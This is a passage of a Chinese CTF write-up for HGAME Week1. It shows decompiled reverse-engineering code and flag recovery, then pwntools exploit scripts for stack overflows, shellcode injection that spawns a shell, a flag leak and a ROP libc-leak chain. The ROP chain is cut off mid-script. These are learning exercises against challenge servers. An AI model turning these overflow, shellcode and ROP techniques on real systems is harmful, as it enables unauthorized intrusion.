+</span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>v21; <span style="color:#75715e">// [rsp+B8h] [rbp-100h]
+</span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>v22; <span style="color:#75715e">// [rsp+C0h] [rbp-F8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v23; <span style="color:#75715e">// [rsp+C8h] [rbp-F0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v24; <span style="color:#75715e">// [rsp+D0h] [rbp-E8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v25; <span style="color:#75715e">// [rsp+D8h] [rbp-E0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v26; <span style="color:#75715e">// [rsp+E0h] [rbp-D8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v27; <span style="color:#75715e">// [rsp+E8h] [rbp-D0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v28; <span style="color:#75715e">// [rsp+F0h] [rbp-C8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v29; <span style="color:#75715e">// [rsp+F8h] [rbp-C0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v30; <span style="color:#75715e">// [rsp+100h] [rbp-B8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v31; <span style="color:#75715e">// [rsp+108h] [rbp-B0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v32; <span style="color:#75715e">// [rsp+110h] [rbp-A8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v33; <span style="color:#75715e">// [rsp+120h] [rbp-98h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v34; <span style="color:#75715e">// [rsp+128h] [rbp-90h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v35; <span style="color:#75715e">// [rsp+130h] [rbp-88h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v36; <span style="color:#75715e">// [rsp+138h] [rbp-80h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v37; <span style="color:#75715e">// [rsp+140h] [rbp-78h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v38; <span style="color:#75715e">// [rsp+148h] [rbp-70h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v39; <span style="color:#75715e">// [rsp+150h] [rbp-68h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v40; <span style="color:#75715e">// [rsp+158h] [rbp-60h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v41; <span style="color:#75715e">// [rsp+160h] [rbp-58h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v42; <span style="color:#75715e">// [rsp+170h] [rbp-48h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v43; <span style="color:#75715e">// [rsp+190h] [rbp-28h]
+</span><span style="color:#75715e"></span>
+  sub_140002AE0(<span style="color:#f92672">&amp;</span>v15, argv, envp);
+  sub_1400018D0(std<span style="color:#f92672">::</span>cin, <span style="color:#f92672">&amp;</span>v15);
+  v17 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hgame{&#34;</span>;
+  sub_140002B30(<span style="color:#f92672">&amp;</span>v16);
+  <span style="color:#66d9ef">if</span> ( sub_1400040B0(<span style="color:#f92672">&amp;</span>v15, v17, <span style="color:#ae81ff">0</span>i64) <span style="color:#f92672">||</span> sub_1400040B0(<span style="color:#f92672">&amp;</span>v15, <span style="color:#e6db74">&#34;}&#34;</span>, <span style="color:#ae81ff">0</span>i64) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">61</span> )
+  {
+    v7 <span style="color:#f92672">=</span> sub_140001900(std<span style="color:#f92672">::</span>cout, <span style="color:#e6db74">&#34;ERR01&#34;</span>);
+    std<span style="color:#f92672">::</span>basic_ostream<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">&lt;&lt;</span>(v7, sub_140002830);
+    sub_140003010(<span style="color:#f92672">&amp;</span>v16);
+    sub_140002FA0((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v15);
+    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>i64; ; i <span style="color:#f92672">=</span> v13 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> )
+    {
+      v13 <span style="color:#f92672">=</span> sub_140004060((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v15, <span style="color:#ae81ff">0x5Fu</span>, i);<span style="color:#75715e">// v15 is input
+</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> ( v13 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+        <span style="color:#66d9ef">break</span>;
+      v18 <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)sub_1400043B0((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v15, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v42);
+      v19 <span style="color:#f92672">=</span> v18;
+      v3 <span style="color:#f92672">=</span> sub_140003E80(v18);
+      v20 <span style="color:#f92672">=</span> atoll(v3);
+      sub_140004350((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v16, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v20);
+      sub_140002FA0((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v42);
+    }
+    v21 <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)sub_1400043B0((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v15, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v43);
+    v22 <span style="color:#f92672">=</span> v21;
+    v4 <span style="color:#f92672">=</span> sub_140003E80(v21);
+    v23 <span style="color:#f92672">=</span> atoll(v4);
+    sub_140004350((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v16, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v23);
+    sub_140002FA0((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v43);               <span style="color:#75715e">// free
+</span><span style="color:#75715e"></span>    v33 <span style="color:#f92672">=</span> <span style="color:#ae81ff">26727</span>i64;
+    v34 <span style="color:#f92672">=</span> <span style="color:#ae81ff">24941</span>i64;
+    v35 <span style="color:#f92672">=</span> <span style="color:#ae81ff">101</span>i64;
+    v36 <span style="color:#f92672">=</span> <span style="color:#ae81ff">29285</span>i64;
+    v37 <span style="color:#f92672">=</span> <span style="color:#ae81ff">26995</span>i64;
+    v38 <span style="color:#f92672">=</span> <span style="color:#ae81ff">29551</span>i64;
+    v39 <span style="color:#f92672">=</span> <span style="color:#ae81ff">29551</span>i64;
+    v40 <span style="color:#f92672">=</span> <span style="color:#ae81ff">25953</span>i64;
+    v41 <span style="color:#f92672">=</span> <span style="color:#ae81ff">29561</span>i64;
+    v24 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>i64;
+    v25 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+    v26 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>i64;
+    v27 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+    v28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>i64;
+    v29 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>i64;
+    v30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>i64;
+    v31 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>i64;
+    v32 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>i64;
+    <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>j )
+    {
+      <span style="color:#66d9ef">for</span> ( k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64; k <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>k )
+      {
+        v14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+        <span style="color:#66d9ef">for</span> ( l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; l <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>l )
+          v14 <span style="color:#f92672">+=</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>v24 <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> l <span style="color:#f92672">+</span> k) <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)sub_1400031E0(<span style="color:#f92672">&amp;</span>v16, l <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> j);
+        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>v33 <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> k) <span style="color:#f92672">!=</span> v14 )
+        {
+          v5 <span style="color:#f92672">=</span> sub_140001900(std<span style="color:#f92672">::</span>cout, <span style="color:#e6db74">&#34;Err02&#34;</span>);
+          std<span style="color:#f92672">::</span>basic_ostream<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">&lt;&lt;</span>(v5, sub_140002830);
+          sub_140003010(<span style="color:#f92672">&amp;</span>v16);
+          sub_140002FA0((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v15);
+          <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+      }
+    }
+    v8 <span style="color:#f92672">=</span> sub_140001900(std<span style="color:#f92672">::</span>cout, <span style="color:#e6db74">&#34;you are good at re&#34;</span>);
+    std<span style="color:#f92672">::</span>basic_ostream<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">&lt;&lt;</span>(v8, sub_140002830);
+    sub_140003010(<span style="color:#f92672">&amp;</span>v16);
+    sub_140002FA0((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v15);
+    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  }
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>很长，刚开始看得我一愣一愣的。
+一步步分析一下。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">sub_1400018D0(std<span style="color:#f92672">::</span>cin, <span style="color:#f92672">&amp;</span>v15);
+  v17 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hgame{&#34;</span>;
+  sub_140002B30(<span style="color:#f92672">&amp;</span>v16);
+  <span style="color:#66d9ef">if</span> ( sub_1400040B0(<span style="color:#f92672">&amp;</span>v15, v17, <span style="color:#ae81ff">0</span>i64) <span style="color:#f92672">||</span> sub_1400040B0(<span style="color:#f92672">&amp;</span>v15, <span style="color:#e6db74">&#34;}&#34;</span>, <span style="color:#ae81ff">0</span>i64) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">61</span> )
+  {
+      <span style="color:#75715e">// 略
+</span><span style="color:#75715e"></span>  }
+</code></pre></div><p>这里是第一步，必须要不满足上面的条件程序才能继续执行，不然会报错然后退出。
+但是那个<code>sub_1400040B0</code>函数打开真的有点绕，没看懂，就盲测了一下，把<code>hgame{.+}</code>这样格式的里面填充字符，发现里面的长度必须是55才行，所以猜到这个函数的大概意思就是计算在第一个参数字符串的第二个参数对应的字符串之前的长度。。所以上面的<code>sub_1400040B0(&amp;v15, &quot;}&quot;, 0i64) != 61</code>也很好理解了，因为<code>55+len('hgame{')</code>刚好是61。。
+接下来的一坨，太绕了没看懂。跳过一下。
+到了这里，逻辑还是比较清晰的</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>j )
+    {
+      <span style="color:#66d9ef">for</span> ( k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64; k <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>k )
+      {
+        v14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+        <span style="color:#66d9ef">for</span> ( l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; l <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>l )
+          v14 <span style="color:#f92672">+=</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>v24 <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> l <span style="color:#f92672">+</span> k) <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)sub_1400031E0(<span style="color:#f92672">&amp;</span>v16, l <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> j);
+        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>v33 <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> k) <span style="color:#f92672">!=</span> v14 )
+        {
+          <span style="color:#75715e">// 略
+</span><span style="color:#75715e"></span>        }
+</code></pre></div><p>这里显然是一段矩阵之类的运算，v17参加计算的关键
+拿python和手算了一段。。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">
+v34 <span style="color:#f92672">=</span> (
+	<span style="color:#ae81ff">26727</span>, <span style="color:#ae81ff">24941</span>, <span style="color:#ae81ff">101</span>,
+	<span style="color:#ae81ff">29285</span>, <span style="color:#ae81ff">26995</span>, <span style="color:#ae81ff">29551</span>,
+	<span style="color:#ae81ff">29551</span>, <span style="color:#ae81ff">25953</span>, <span style="color:#ae81ff">29561</span>,
+	)
+
+v25 <span style="color:#f92672">=</span> (
+	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
+	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
+	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>,
+	)
+
+v17 <span style="color:#f92672">=</span> [
+	<span style="color:#f92672">-</span><span style="color:#ae81ff">24840</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">78193</span>, <span style="color:#ae81ff">51567</span>, <span style="color:#75715e">#17</span>
+	<span style="color:#ae81ff">2556</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">26463</span>, <span style="color:#ae81ff">26729</span>,   <span style="color:#75715e">#15</span>
+	<span style="color:#ae81ff">3608</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">25933</span>, <span style="color:#ae81ff">25943</span>,   <span style="color:#75715e">#15</span>
+	]
+
+<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+	<span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+		v15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+		<span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+			<span style="color:#75715e">#print j, k, l, 3 * l + k, l + 3 * j, 3 * j + k</span>
+			v15 <span style="color:#f92672">+=</span> v25[<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> l <span style="color:#f92672">+</span> k] <span style="color:#f92672">*</span> v17[l <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> j]
+		<span style="color:#66d9ef">if</span> v34[<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> k] <span style="color:#f92672">!=</span> v15:
+			<span style="color:#66d9ef">print</span> j, k, l,  <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> l <span style="color:#f92672">+</span> k, l <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> j, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> k, <span style="color:#e6db74">&#39;dismatch!&#39;</span>
+</code></pre></div><p>然后半自动化地算出了v17的数据。
+再接着又没思路了。。本着蒙一蒙的思想，绕到了中间代码
+看到这个函数<code>v13 = sub_140004060((__int64)&amp;v15, 0x5Fu, i);</code>
+这个<code>0x5F</code>有点可疑，<code>chr(95)</code>了一下发现刚好是字符<code>'_'</code>！
+然后转头一想为啥中间的长度得55呢？
+算了一下v17的每个值的长度，发现是47，再如果加上<code>_</code>的8个连接符，长度不就刚好是55嘛。再加上之前的<code>atoll</code>函数，大概猜到了这段的意思，于是构造了
+<code>'hgame{' + '_'.join((str(i) for i in v17)) + '}'</code>
+得到
+<code>hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943}</code>
+猜出flag。。</p>
+<h5 id="week1-reverse-ak">Week1 Reverse AK</h5>
+<h3 id="0x02-pwn">0x02 Pwn</h3>
+<h4 id="hard_aaaaa">Hard_AAAAA</h4>
+<p>拖进ida，F5
+<img src="media/15792383134168/%E5%9B%BE%E7%89%873.png" alt="图片3">
+找到s和v5之间的距离，然后看memcpy条件
+<img src="media/15792383134168/%E5%9B%BE%E7%89%872.png" alt="图片2">
+再写exp</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i386&#39;</span>, os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span>)
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.103.214.163&#34;</span>, <span style="color:#ae81ff">20000</span>)
+sh<span style="color:#f92672">.</span>send((<span style="color:#ae81ff">0xac</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x31</span>)<span style="color:#f92672">*</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;0O0o</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">O0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>interactive()
+sh<span style="color:#f92672">.</span>close()
+</code></pre></div><p>getshell，然后cat拿到flag
+<img src="media/15792383134168/%E5%9B%BE%E7%89%871.png" alt="图片1"></p>
+<h4 id="number_killer">Number_Killer</h4>
+<p>栈溢出然后执行shellcode的事情，因为刚学所以也做了挺久的。
+ida打开研究，发现程序是把每一行输入的数字转换成long long保存在栈上。
+直接上exp吧。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/local/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+context<span style="color:#f92672">.</span>os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span>
+context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;little&#39;</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;47.103.214.163&#39;</span>, <span style="color:#ae81ff">20001</span>)
+gift <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400789</span>
+
+shellcode <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">11</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff\xff\xff\xff\x0b\x00\x00\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> asm(<span style="color:#e6db74">&#39;nop&#39;</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(gift) <span style="color:#f92672">+</span> asm(shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>sh())
+p<span style="color:#f92672">.</span>recv()
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(shellcode)<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>):
+    code <span style="color:#f92672">=</span> shellcode[i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]
+    c <span style="color:#f92672">=</span>  c_longlong(u64(code))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>send(str(c)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+p<span style="color:#f92672">.</span>interactive()
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p><img src="media/15792383134168/Screen%20Shot%202020-01-22%20at%2012.25.07%20AM.png" alt="Screen Shot 2020-01-22 at 12.25.07 A">
+拿到flag</p>
+<h4 id="one_shot">One_Shot</h4>
+<p>拖ida打开
+<img src="media/15792383134168/Screen%20Shot%202020-01-20%20at%204.58.44%20PM.png" alt="Screen Shot 2020-01-20 at 4.58.44 P">
+可知flag一开始就被读到.bss那段内存上了，flag上面是name变量
+<img src="media/15792383134168/Screen%20Shot%202020-01-20%20at%205.01.37%20PM.png" alt="Screen Shot 2020-01-20 at 5.01.37 P">
+name和flag之间相差32，而<code>scanf(&quot;%32s&quot;, &amp;name)</code>最多读32个字符然后第33个字符就会被置零<code>\0</code>。
+再往下看发现会让输入一个整数（地址），然后<code>*v4 = 1</code>会把它置为一，这样printf就可把name和flag一起打印出来了。
+写脚本（其实手输也行）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;47.103.214.163&#39;</span>, <span style="color:#ae81ff">20002</span>)
+addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6010df</span>
+<span style="color:#66d9ef">print</span> p<span style="color:#f92672">.</span>recv()
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">31</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">print</span> p<span style="color:#f92672">.</span>recv()
+p<span style="color:#f92672">.</span>send(str(addr)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+r <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()
+<span style="color:#75715e">##print(repr(r))</span>
+<span style="color:#66d9ef">print</span> r<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+<span style="color:#75715e">##p.interactive()</span>
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p>运行
+<img src="media/15792383134168/Screen%20Shot%202020-01-20%20at%205.09.46%20PM.png" alt="Screen Shot 2020-01-20 at 5.09.46 P">
+拿到flag</p>
+<h4 id="rop_level0">ROP_LEVEL0</h4>
+<p>学习了两天的ROP然后终于知道一点点操作了。。。
+ida打开，F5看源码，然后gdb调试，main的溢出offset是0x50。
+想着拿shell，于是就要leak libc版本然后call system，都是ROP的基本操作，然而我刚学所以很不熟练基本每一步都可能踩坑。。
+下面是exp，参考了好多范例模出来的。。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/local/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> LibcSearcher
+
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ROP_LEVEL0&#39;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ROP_LEVEL0&#34;</span>)
+
+main_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x58</span>
+vuln_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x18</span>
+
+RDI <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400753</span>
+RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004004c9</span>
+
+p<span style="color:#f92672">.</span>recv()
+
+MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+VULN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;vuln&#39;</span>]
+PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@plt: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> PUTS)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;__libc_start_main: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> LIBC_START_MAIN)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;MAIN: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">, VULN: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (MAIN, VULN))
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> main_offset
+payload <span style="color:#f92672">+=</span> p64(RDI)
+payload <span style="color:#f92672">+=</span> p64(LIBC_START_MAIN)
+payload <span style="color:#f92672">+=</span> p64(PUTS)
+payload <span style="color:#f92672">+=</span> p64(MAIN)
+p<span style="color:#f92672">.</span>send(payload)
+
+data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">0</span>]
+leak <span style="color:#f92672">=</span> u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> leak)
+
+libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>, leak)
+libcbase <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>)
